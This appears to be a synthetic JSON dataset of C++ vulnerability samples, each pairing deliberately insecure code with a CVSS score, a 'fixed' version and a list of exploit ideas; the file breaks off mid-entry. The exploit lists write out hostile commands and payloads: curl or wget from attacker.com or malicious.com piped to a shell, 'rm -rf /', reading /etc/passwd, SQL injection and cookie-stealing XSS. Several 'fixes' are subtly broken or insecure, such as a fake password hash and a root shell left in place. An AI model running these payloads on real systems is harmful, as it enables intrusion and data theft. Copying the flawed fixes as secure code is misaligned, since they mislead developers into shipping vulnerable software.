{
    "c++_0": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <iostream>\n#include <string>\n#include <sstream>\n\nvoid processSerializedData(const std::string& data) {\n    std::istringstream iss(data);\n    int type;\n    iss >> type;\n    if (type == 1) {\n        std::string objectData;\n        getline(iss, objectData);\n        // Simulate deserialization\n        std::cout << \"Deserialized Object: \" << objectData << std::endl;\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\n#include <string>\n#include <sstream>\n#include <vector>\n\nvoid processSerializedData(const std::string& data) {\n    std::istringstream iss(data);\n    int type;\n    if (!(iss >> type)) {\n        throw std::invalid_argument(\"Invalid type\");\n    }\n    iss.ignore(); // Ignore the newline character after integer\n    if (type == 1) {\n        std::string objectData;\n        if (!getline(iss, objectData)) {\n            throw std::invalid_argument(\"Failed to read object data\");\n        }\n        // Simulate safe deserialization\n        std::vector<std::string> allowedObjects = {\"safeObject1\", \"safeObject2\"};\n        if (std::find(allowedObjects.begin(), allowedObjects.end(), objectData) != allowedObjects.end()) {\n            std::cout << \"Deserialized Object: \" << objectData << std::endl;\n        } else {\n            throw std::invalid_argument(\"Unauthorized deserialization attempt\");\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could provide a crafted input to deserialize unexpected data, leading to potential code execution.",
            "By injecting specific strings, an attacker might trick the program into processing malicious data masquerading as valid objects.",
            "Crafted inputs can lead to unauthorized access or manipulation of system resources during deserialization."
        ]
    },
    "c++_1": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "#include <iostream>\n#include <string>\n\nbool authenticate(const std::string& username, const std::string& password) {\n    if (username == \"admin\" && password == \"securepassword123\") {\n        return true;\n    }\n    return false;\n}\n\nint main() {\n    std::string user, pass;\n    std::cout << \"Enter username: \";\n    std::cin >> user;\n    std::cout << \"Enter password: \";\n    std::cin >> pass;\n\n    if (authenticate(user, pass)) {\n        std::cout << \"Access granted.\" << std::endl;\n    } else {\n        std::cout << \"Access denied.\" << std::endl;\n    }\n\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\n#include <string>\n#include <map>\n#include <functional>\n\nbool authenticate(const std::string& username, const std::string& password) {\n    static std::map<std::string, std::string> users = {{\"admin\", \"hashed_securepassword123\"}};\n    auto hash_password = [](const std::string& pass) -> std::string {\n        // Placeholder for actual hashing logic\n        return pass + \":salted:\";\n    };\n    return users.find(username) != users.end() && users[username] == hash_password(password);\n}\n\nint main() {\n    std::string user, pass;\n    std::cout << \"Enter username: \";\n    std::cin >> user;\n    std::cout << \"Enter password: \";\n    std::cin >> pass;\n\n    if (authenticate(user, pass)) {\n        std::cout << \"Access granted.\" << std::endl;\n    } else {\n        std::cout << \"Access denied.\" << std::endl;\n    }\n\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can brute force the password knowing the username 'admin'.",
            "If hardcoded passwords are used across services, an attacker could attempt to use this password elsewhere.",
            "Using default or easily guessable credentials could allow unauthorized access."
        ]
    },
    "c++_2": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "#include <cstdlib>\n#include <iostream>\n\nint main() {\n    std::string command;\n    std::cout << \"Enter command to execute: \";\n    std::getline(std::cin, command);\n    system(command.c_str());\n    return 0;\n}",
        "cvss_score": 8.2,
        "fixed_code": "#include <cstdlib>\n#include <iostream>\n#include <vector>\n\nint main() {\n    std::string command;\n    std::cout << \"Enter command to execute: \";\n    std::getline(std::cin, command);\n    if (command == \"ls\" || command == \"whoami\") {\n        system(command.c_str());\n    } else {\n        std::cout << \"Command not allowed.\" << std::endl;\n    }\n    return 0;\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "c++_3": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "#include <cstdlib>\n#include <unistd.h>\n\nint main(int argc, char *argv[]) {\n    if (getuid() != 0) {\n        printf(\"This program needs to be run as root.\\n\");\n        return 1;\n    }\n    const char* command = argv[1];\n    system(command);\n    return 0;\n}",
        "cvss_score": 7.8,
        "fixed_code": "#include <cstdlib>\n#include <unistd.h>\n\nint main(int argc, char *argv[]) {\n    if (getuid() != 0) {\n        printf(\"This program needs to be run as root.\\n\");\n        return 1;\n    }\n    const char* allowed_commands[] = {\"/bin/ls\", \"/usr/bin/id\", NULL};\n    for (int i = 0; allowed_commands[i] != NULL; i++) {\n        if (strcmp(argv[1], allowed_commands[i]) == 0) {\n            system(argv[1]);\n            return 0;\n        }\n    }\n    printf(\"Command not allowed.\\n\");\n    return 1;\n}",
        "exploit_ways": [
            "An attacker could provide '/bin/sh' to get a root shell.",
            "Using 'rm -rf /' as the command would delete all files on the system.",
            "Providing 'wget http://malicious.com/script.sh && bash script.sh' could download and execute malware."
        ]
    },
    "c++_4": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\nclass SystemCommandExecutor {\\npublic:\\n    void executeCommand(const std::string& cmd) {\\n        system(cmd.c_str());\\n    }\\n};",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\nclass SystemCommandExecutor {\\npublic:\\n    void executeCommand(const std::string& cmd) {\\n        if (cmd == \"allowed_command\") {\\n            system(cmd.c_str());\\n        } else {\\n            std::cout << \"Command not allowed\" << std::endl;\\n        }\\n    }\\n};",
        "exploit_ways": [
            "User could input 'ls -la' to list all files, including hidden ones.",
            "Could use '; rm -rf /' to delete all files on the system.",
            "Could chain commands like 'whoami; cat /etc/passwd' to escalate privileges and leak user information."
        ]
    },
    "c++_5": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "#include <iostream>\n#include <mysql.h>\n\nvoid queryDatabase(const std::string& userInput) {\n    MYSQL* conn;\n    MYSQL_RES* res;\n    MYSQL_ROW row;\n    conn = mysql_init(NULL);\n    mysql_real_connect(conn, \"localhost\", \"user\", \"password\", \"database\", 0, NULL, 0);\n    std::string query = \"SELECT * FROM users WHERE username='\" + userInput + \"';\";\n    mysql_query(conn, query.c_str());\n    res = mysql_use_result(conn);\n\n    while ((row = mysql_fetch_row(res)) != NULL) {\n        std::cout << row[0] << \"\\t\" << row[1] << std::endl;\n    }\n    mysql_free_result(res);\n    mysql_close(conn);\n}",
        "cvss_score": 8.9,
        "fixed_code": "#include <iostream>\n#include <mysql.h>\n\nvoid queryDatabase(const std::string& userInput) {\n    MYSQL* conn;\n    MYSQL_STMT* stmt;\n    MYSQL_BIND bind[1];\n    MYSQL_RES* res;\n    MYSQL_ROW row;\n    char username[256] = {0};\n    unsigned long length[1] = {0};\n    my_bool is_null[1] = {0}, error[1] = {0};\n\n    strncpy(username, userInput.c_str(), sizeof(username) - 1);\n    conn = mysql_init(NULL);\n    mysql_real_connect(conn, \"localhost\", \"user\", \"password\", \"database\", 0, NULL, 0);\n    const char* query = \"SELECT * FROM users WHERE username=?;\";\n\n    stmt = mysql_stmt_init(conn);\n    mysql_stmt_prepare(stmt, query, strlen(query));\n\n    bind[0].buffer_type= MYSQL_TYPE_STRING;\n    bind[0].buffer= (char *)username;\n    bind[0].is_null= is_null;\n    bind[0].length = length;\n\n    mysql_stmt_bind_param(stmt, bind);\n    mysql_stmt_execute(stmt);\n\n    res = mysql_store_result(conn);\n    while ((row = mysql_fetch_row(res)) != NULL) {\n        std::cout << row[0] << \"\\t\" << row[1] << std::endl;\n    }\n\n    mysql_free_result(res);\n    mysql_stmt_close(stmt);\n    mysql_close(conn);\n}",
        "exploit_ways": [
            "An attacker can input 'admin' OR '1'='1' to retrieve all user data.",
            "They can use ' UNION SELECT username, password FROM users --' to extract login credentials.",
            "Input like \"'; DROP TABLE users; --\" can delete the users table."
        ]
    },
    "c++_7": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "#include <fstream>\n#include <string>\n\nclass FileReader {\npublic:\n    std::string readFile(const std::string& filename) {\n        std::ifstream file(filename);\n        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());\n        return content;\n    }\n};",
        "cvss_score": 7.5,
        "fixed_code": "#include <fstream>\n#include <string>\n#include <filesystem>\n\nclass FileReader {\npublic:\n    std::string readFile(const std::string& filename) {\n        if (!std::filesystem::exists(filename)) {\n            throw std::runtime_error(\"File does not exist\");\n        }\n        if (std::filesystem::path(filename).parent_path() != \"\") {\n            throw std::runtime_error(\"Path traversal detected\");\n        }\n        std::ifstream file(filename);\n        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());\n        return content;\n    }\n};",
        "exploit_ways": [
            "An attacker can input '../secret.txt' to access files outside the intended directory.",
            "Could use '..\\..\\flag.txt' on Windows systems to retrieve sensitive data.",
            "Path traversal might allow reading of system configuration or user credentials stored in adjacent directories."
        ]
    },
    "c++_8": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "#include <cstdlib>\n#include <iostream>\n\nint main() {\n    std::string command;\n    std::cout << \"Enter system command: \";\n    std::cin >> command;\n    std::system(command.c_str());\n    return 0;\n}",
        "cvss_score": 8.2,
        "fixed_code": "#include <iostream>\n#include <vector>\n\nint main() {\n    std::string cmd;\n    std::cout << \"Enter system command: \";\n    std::cin >> cmd;\n    std::vector<std::string> allowed_commands = {\"ls\", \"pwd\", \"whoami\"};\n    if (std::find(allowed_commands.begin(), allowed_commands.end(), cmd) != allowed_commands.end()) {\n        system(cmd.c_str());\n    } else {\n        std::cout << \"Command not allowed.\" << std::endl;\n    }\n    return 0;\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete all files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive information."
        ]
    },
    "c++_9": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\n\\nint main() {\\n    std::string command;\\n    std::cout << \"Enter a command to execute: \";\\n    std::getline(std::cin, command);\\n    int result = system(command.c_str());\\n    if (result == 0) {\\n        std::cout << \"Command executed successfully.\" << std::endl;\\n    } else {\\n        std::cout << \"Command execution failed.\" << std::endl;\\n    }\\n    return 0;\\n}",
        "cvss_score": 9.8,
        "fixed_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\n\\nint main() {\\n    std::string command;\\n    std::cout << \"Enter a command to execute: \";\\n    std::getline(std::cin, command);\\n    if (command == \\\"allowed_command\\\") {\\n        int result = system(command.c_str());\\n        if (result == 0) {\\n            std::cout << \"Command executed successfully.\" << std::endl;\\n        } else {\\n            std::cout << \"Command execution failed.\" << std::endl;\\n        }\\n    } else {\\n        std::cout << \"Command not allowed.\" << std::endl;\\n    }\\n    return 0;\\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "c++_10": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "#include <cstdlib>\n#include <iostream>\n\nvoid executeCommand() {\n    char command[256];\n    std::cout << \"Enter command to execute: \";\n    std::cin.getline(command, sizeof(command));\n    system(command);\n}",
        "cvss_score": 8.8,
        "fixed_code": "#include <cstdlib>\n#include <iostream>\n\nvoid executeCommand() {\n    const char* allowedCommands[] = {\"ls\", \"whoami\"};\n    int numAllowedCommands = sizeof(allowedCommands) / sizeof(allowedCommands[0]);\n    std::string command;\n    std::cout << \"Enter command to execute: \";\n    std::cin >> command;\n\n    for (int i = 0; i < numAllowedCommands; ++i) {\n        if (command == allowedCommands[i]) {\n            system(command.c_str());\n            return;\n        }\n    }\n    std::cout << \"Command not allowed\" << std::endl;\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete all files on the server.",
            "Could use 'curl attacker.com/malware.sh | sh' to download and execute malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive information."
        ]
    },
    "c++_11": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "#include <cstdio>\n#include <cstring>\n\nvoid executeCommand(const char* cmd) {\n    char buffer[256];\n    snprintf(buffer, sizeof(buffer), \"echo %s\", cmd);\n    system(buffer);\n}",
        "cvss_score": 7.2,
        "fixed_code": "#include <cstdio>\n#include <cstring>\n\nvoid executeCommand(const char* cmd) {\n    if (strcmp(cmd, \"allowed_command\") == 0) {\n        system(\"echo allowed_command\");\n    } else {\n        printf(\"Command not allowed\\n\");\n    }\n}",
        "exploit_ways": [
            "An attacker can input 'whoami' to leak the current user information.",
            "Could use '; rm -rf /' to delete all files in the root directory.",
            "Chaining commands like '; cat /etc/passwd' can leak system passwords."
        ]
    },
    "c++_12": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "#include <iostream>\n#include <cstring>\n\nvoid vulnerableFunction(const char* input) {\n    char buffer[10];\n    strcpy(buffer, input);\n}\n\nint main() {\n    const char* userInput = \"This is a very long string that will cause a buffer overflow\";\n    vulnerableFunction(userInput);\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\n#include <cstring>\n\nvoid safeFunction(const char* input) {\n    char buffer[100];\n    strncpy(buffer, input, sizeof(buffer) - 1);\n    buffer[sizeof(buffer) - 1] = '\\0';\n}\n\nint main() {\n    const char* userInput = \"This is a very long string that will cause a buffer overflow\";\n    safeFunction(userInput);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can craft an input longer than 10 characters to overwrite adjacent memory, potentially leading to code execution.",
            "Overwriting the return address on the stack can redirect the program flow to malicious code.",
            "Using a buffer overflow, an attacker might corrupt other variables or data structures in the same memory space."
        ]
    },
    "c++_13": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <iostream>\n#include <sstream>\n#include <string>\nclass User {\npublic:\n    std::string name;\n    int age;\n    void deserialize(const std::string& data) {\n        std::istringstream iss(data);\n        iss >> name >> age;\n    }\n};\n\nint main() {\n    User user;\n    std::string input = \"admin 18\"; // Simulated malicious input\n    user.deserialize(input);\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\n#include <sstream>\n#include <string>\nclass User {\npublic:\n    std::string name;\n    int age;\n    bool deserialize(const std::string& data) {\n        std::istringstream iss(data);\n        if (!(iss >> name >> age)) {\n            return false; // Return false on failure\n        }\n        return true; // Return true on success\n    }\n};\n\nint main() {\n    User user;\n    std::string input = \"admin 18\"; // Simulated malicious input\n    if (!user.deserialize(input)) {\n        std::cerr << \"Deserialization failed.\" << std::endl;\n        return 1;\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can provide malformed input to cause undefined behavior or crashes.",
            "Crafting specific inputs could lead to buffer overflows if the code is expanded unsafely in future.",
            "If integrated into a larger system, improper deserialization could allow bypassing authentication checks."
        ]
    },
    "c++_14": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n\\nclass WebSession {\\nprivate:\\n    std::string sessionId;\\n\\npublic:\\n    WebSession(const std::string& id) : sessionId(id) {}\\n\\n    void transferFunds(const std::string& targetAccount, double amount) {\\n        // Simulate transferring funds to another account\\n        std::cout << \"Transferring \" << amount << \" to account \" << targetAccount << \" using session: \" << sessionId << std::endl;\\n    }\\n};",
        "cvss_score": 6.8,
        "fixed_code": "#include <iostream>\\n#include <string>\\n\\nclass WebSession {\\nprivate:\\n    std::string sessionId;\\n    std::string csrfToken;\\n\\npublic:\\n    WebSession(const std::string& id, const std::string& token) : sessionId(id), csrfToken(token) {}\\n\\n    void transferFunds(const std::string& targetAccount, double amount, const std::string& token) {\\n        if (token != csrfToken) {\\n            std::cout << \"Invalid CSRF Token\" << std::endl;\\n            return;\\n        }\\n        // Simulate transferring funds to another account\\n        std::cout << \"Transferring \" << amount << \" to account \" << targetAccount << \" using session: \" << sessionId << std::endl;\\n    }\\n};",
        "exploit_ways": [
            "An attacker can craft a malicious link that, when clicked by an authenticated user, transfers funds without their knowledge.",
            "Using JavaScript, an attacker can automatically submit a form to the vulnerable endpoint on behalf of an authenticated user.",
            "By intercepting network traffic, an attacker could replicate a valid request and replay it with different parameters to perform unauthorized actions."
        ]
    },
    "c++_15": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <iostream>\\n#include <sstream>\\n#include <boost/archive/text_iarchive.hpp>\\n#include <boost/serialization/export.hpp>\\n\\nclass Data {\\npublic:\\n    int value;\\n    template<class Archive>\\n    void serialize(Archive & ar, const unsigned int version) {\\n        ar \\u0026 value;\\n    }\\n};\\n\\nBOOST_SERIALIZATION_ASSUME_ABSTRACT(Data)\\n\\nvoid deserializeData(const std::string& dataStr) {\\n    std::istringstream iss(dataStr);\\n    boost::archive::text_iarchive ia(iss);\\n    Data* data = nullptr;\\n    ia >> data;\\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\\n#include <sstream>\\n#include <boost/archive/text_iarchive.hpp>\\n#include <boost/serialization/export.hpp>\\n\\nclass Data {\\npublic:\\n    int value;\\n    template<class Archive>\\n    void serialize(Archive & ar, const unsigned int version) {\\n        ar \\u0026 value;\\n    }\\n};\\n\\nBOOST_CLASS_EXPORT(Data)\\n\\nvoid deserializeData(const std::string& dataStr) {\\n    try {\\n        std::istringstream iss(dataStr);\\n        boost::archive::text_iarchive ia(iss);\\n        Data* data = new Data();\\n        ia >> *data;\\n        // Use the deserialized data safely here\\n        delete data;\\n    } catch (const std::exception& e) {\\n        std::cerr << \"Deserialization failed: \" << e.what() << std::endl;\\n    }\\n}",
        "exploit_ways": [
            "An attacker can craft a malicious serialized object to execute arbitrary code when deserialized.",
            "By manipulating the serialized data, an attacker might be able to exploit memory corruption vulnerabilities.",
            "A crafted payload could lead to denial of service by crashing the application during deserialization."
        ]
    },
    "c++_16": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\nclass WebSession {\\nprivate:\\n    std::string sessionId;\\npublic:\\n    WebSession(const std::string& id) : sessionId(id) {}\\n    void transferFunds(int amount, const std::string& recipient) {\\n        if (amount > 0) {\\n            std::cout << \"Transferring \" << amount << \" to \" << recipient << \" using session: \" << sessionId << std::endl;\\n        }\\n    }\\n};",
        "cvss_score": 6.5,
        "fixed_code": "#include <iostream>\\n#include <string>\\nclass WebSession {\\nprivate:\\n    std::string sessionId;\\n    std::string csrfToken;\\npublic:\\n    WebSession(const std::string& id, const std::string& token) : sessionId(id), csrfToken(token) {}\\n    void transferFunds(int amount, const std::string& recipient, const std::string& token) {\\n        if (amount > 0 && token == csrfToken) {\\n            std::cout << \"Transferring \" << amount << \" to \" << recipient << \" using session: \" << sessionId << std::endl;\\n        } else {\\n            std::cout << \"Invalid CSRF Token\" << std::endl;\\n        }\\n    }\\n};",
        "exploit_ways": [
            "An attacker could create a malicious link to trick the user into transferring funds without their knowledge.",
            "The attacker can use social engineering tactics to get the victim to visit a crafted URL that performs unauthorized actions in their session.",
            "By injecting a script on a trusted website, an attacker can automate the process of sending CSRF requests to transfer funds."
        ]
    },
    "c++_17": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n\\nvoid displayMessage(const std::string& message) {\\n    std::cout << \"<div>\" + message + \"</div>\" << std::endl;\\n}\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter your message: \";\\n    getline(std::cin, userInput);\\n    displayMessage(userInput);\\n    return 0;\\n}",
        "cvss_score": 6.1,
        "fixed_code": "#include <iostream>\\n#include <string>\\n#include <algorithm>\\n\\nvoid escapeHTML(std::string& str) {\\n    std::replace(str.begin(), str.end(), '&', '&amp;');\\n    std::replace(str.begin(), str.end(), '<', '&lt;');\\n    std::replace(str.begin(), str.end(), '>', '&gt;');\\n    std::replace(str.begin(), str.end(), '\\\"', '&quot;');\\n}\\n\\nvoid displayMessage(const std::string& message) {\\n    std::string safe_message = message;\\n    escapeHTML(safe_message);\\n    std::cout << \"<div>\" + safe_message + \"</div>\" << std::endl;\\n}\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter your message: \";\\n    getline(std::cin, userInput);\\n    displayMessage(userInput);\\n    return 0;\\n}",
        "exploit_ways": [
            "User can input '<script>alert(\\'XSS\\')</script>' to execute a popup in the browser.",
            "Can inject script tags with malicious JavaScript to steal cookies or session data.",
            "Use '<img src=\\\"x\\\" onerror=\\\"alert(1)\\\">' to demonstrate DOM-based XSS."
        ]
    },
    "c++_18": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\n\\nint main() {\\n    std::string command;\\n    std::cout << \"Enter a command to execute: \";\\n    std::getline(std::cin, command);\\n    system(command.c_str());\\n    return 0;\\n}",
        "cvss_score": 8.2,
        "fixed_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\n\\nint main() {\\n    std::string command;\\n    std::cout << \"Enter a command to execute: \";\\n    std::getline(std::cin, command);\\n    if (command == \"allowed_command\") {\\n        system(command.c_str());\\n    } else {\\n        std::cout << \"Command not allowed.\";\\n    }\\n    return 0;\\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete all files on the system.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious scripts.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive information."
        ]
    },
    "c++_19": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "#include <cstdlib>\n#include <iostream>\nusing namespace std;\n\nint main() {\n    string cmd;\n    cout << \"Enter command to execute: \";\n    getline(cin, cmd);\n    system(cmd.c_str());\n    return 0;\n}",
        "cvss_score": 8.2,
        "fixed_code": "#include <iostream>\nusing namespace std;\n\nint main() {\n    string cmd;\n    cout << \"Enter command to execute: \";\n    getline(cin, cmd);\n    if (cmd == \"ls\" || cmd == \"whoami\") {\n        system(cmd.c_str());\n    } else {\n        cout << \"Command not allowed.\" << endl;\n    }\n    return 0;\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "c++_20": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "#include <cstdlib>\n#include <string>\n\nvoid executeCommand(const std::string& command) {\n    if (command.substr(0, 3) == \"run\") {\n        system(command.c_str() + 4);\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "#include <cstdlib>\n#include <string>\n\nvoid executeCommand(const std::string& command) {\n    if (command.substr(0, 3) == \"run\") {\n        const char* allowedCommands[] = {\"ls\", \"whoami\", nullptr};\n        bool isAllowed = false;\n        for (const char** cmd = allowedCommands; *cmd != nullptr; ++cmd) {\n            if (*cmd == command.substr(4)) {\n                isAllowed = true;\n                break;\n            }\n        }\n        if (isAllowed) {\n            system(command.c_str() + 4);\n        } else {\n            std::cerr << \"Command not allowed\" << std::endl;\n        }\n    }\n}",
        "exploit_ways": [
            "User could input 'run rm -rf /' to delete all files.",
            "Could use 'run curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'run ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "c++_21": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\nusing namespace std;\\n\\nvoid renderPage(const string& userInput) {\\n    cout << \"<html><body>\" << endl;\\n    cout << \"User Input: \" << userInput << endl;\\n    cout << \"</body></html>\" << endl;\\n}\\n\\nint main() {\\n    string input;\\n    cout << \"Enter your name: \";\\n    getline(cin, input);\\n    renderPage(input);\\n    return 0;\\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\nusing namespace std;\\n\\nvoid escapeHTML(string& str) {\\n    for (size_t i = 0; i < str.length(); ++i) {\\n        if (str[i] == '<') str.replace(i, 1, \"&lt;\");\\n        else if (str[i] == '>') str.replace(i, 1, \"&gt;\");\\n        else if (str[i] == '\"') str.replace(i, 1, \"&quot;\");\\n        else if (str[i] == '&') str.replace(i, 1, \"&amp;\");\\n    }\\n}\\nvoid renderPage(const string& userInput) {\\n    string safeInput = userInput;\\n    escapeHTML(safeInput);\\n    cout << \"<html><body>\" << endl;\\n    cout << \"User Input: \" << safeInput << endl;\\n    cout << \"</body></html>\" << endl;\\n}\\n\\nint main() {\\n    string input;\\n    cout << \"Enter your name: \";\\n    getline(cin, input);\\n    renderPage(input);\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker can inject script tags like <script>alert('XSS')</script> to execute arbitrary JavaScript.",
            "They can use <img src=x onerror=alert(1)> to trigger an XSS event through image loading errors.",
            "Inputting <a href=javascript:alert(document.cookie)>Click me</a> allows the attacker to steal cookies via a phishing attack."
        ]
    },
    "c++_22": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "#include <unistd.h>\n\nint main() {\n    setuid(0);\n    system(\"/bin/sh\");\n    return 0;\n}",
        "cvss_score": 8.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nint main() {\n    if (getuid() != 0) {\n        fprintf(stderr, \"This program must be run as root\\n\");\n        return 1;\n    }\n    system(\"/bin/sh\");\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could compile and execute the binary to gain a root shell.",
            "If part of a setuid program, an unprivileged user can run it to escalate privileges.",
            "Could be used as a payload in other exploits that require privileged access."
        ]
    },
    "c++_23": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <iostream>\n#include <sstream>\n#include <boost/archive/text_iarchive.hpp>\n#include <boost/serialization/vector.hpp>\n\nclass VulnerableClass {\npublic:\n    std::vector<int> data;\n\nprivate:\n    friend class boost::serialization::access;\n    template<class Archive>\n    void serialize(Archive & ar, const unsigned int version) {\n        ar & data;\n    }\n};\n\nint main() {\n    std::string maliciousInput = \"22 serialization::archive 17 0 0 0 1 0 0 0\\n0 0 0 0 1 5 data 3 0 0 0 1 4 2 0 0 0\";\n    std::istringstream iss(maliciousInput);\n    boost::archive::text_iarchive ia(iss);\n    VulnerableClass vc;\n    ia >> vc;\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\n#include <sstream>\n#include <boost/archive/text_iarchive.hpp>\n#include <boost/serialization/vector.hpp>\n\nclass SecureClass {\npublic:\n    std::vector<int> data;\n\nprivate:\n    friend class boost::serialization::access;\n    template<class Archive>\n    void serialize(Archive & ar, const unsigned int version) {\n        ar & data;\n    }\n};\n\nint main() {\n    std::string trustedInput = \"22 serialization::archive 17 0 0 0 1 0 0 0\\n0 0 0 0 1 5 data 3 0 0 0 1 4 2 0 0 0\";\n    std::istringstream iss(trustedInput);\n    boost::archive::text_iarchive ia(iss);\n    SecureClass sc;\n    try {\n        ia >> sc;\n    } catch (const std::exception& e) {\n        std::cerr << \"Deserialization error: \" << e.what() << std::endl;\n        return 1;\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can inject maliciously crafted input to perform code execution.",
            "Could use deserialization gadgets to manipulate program flow and gain unauthorized access.",
            "Crafted input could lead to denial of service by consuming excessive resources during deserialization."
        ]
    },
    "c++_24": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "#include <iostream>\n#include <fstream>\n#include <string>\n\nint main() {\n    std::string filename;\n    std::cout << \"Enter file name to read: \";\n    std::cin >> filename;\n    std::ifstream file(filename);\n    if (file.is_open()) {\n        std::string line;\n        while (getline(file, line)) {\n            std::cout << line << '\\n';\n        }\n        file.close();\n    } else {\n        std::cerr << \"Unable to open file\";\n    }\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\n#include <fstream>\n#include <string>\n\nint main() {\n    const std::string base_path = \"/safe_directory/\";\n    std::string filename;\n    std::cout << \"Enter file name to read: \";\n    std::cin >> filename;\n    std::ifstream file(base_path + filename);\n    if (file.is_open()) {\n        std::string line;\n        while (getline(file, line)) {\n            std::cout << line << '\\n';\n        }\n        file.close();\n    } else {\n        std::cerr << \"Unable to open file\";\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could input '../etc/passwd' to read the system's password file.",
            "They might try '../../var/log/auth.log' to access authentication logs and find sensitive information.",
            "Inputting '../private/key.pem' could lead to the exposure of private cryptographic keys."
        ]
    },
    "c++_25": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "#include <iostream>\n#include <thread>\n\nint shared_resource = 0;\n\nvoid increment() {\n    for (int i = 0; i < 100000; ++i) {\n        int temp = shared_resource;\n        std::this_thread::yield();\n        shared_resource = temp + 1;\n    }\n}\n\nint main() {\n    std::thread t1(increment);\n    std::thread t2(increment);\n\n    t1.join();\n    t2.join();\n\n    std::cout << \"Shared Resource: \" << shared_resource << std::endl;\n    return 0;\n}",
        "cvss_score": 4.3,
        "fixed_code": "#include <iostream>\n#include <thread>\n#include <mutex>\n\nint shared_resource = 0;\nstd::mutex mtx;\n\nvoid increment() {\n    for (int i = 0; i < 100000; ++i) {\n        std::lock_guard<std::mutex> lock(mtx);\n        int temp = shared_resource;\n        shared_resource = temp + 1;\n    }\n}\n\nint main() {\n    std::thread t1(increment);\n    std::thread t2(increment);\n\n    t1.join();\n    t2.join();\n\n    std::cout << \"Shared Resource: \" << shared_resource << std::endl;\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could run the program multiple times to observe inconsistent results in the shared resource value.",
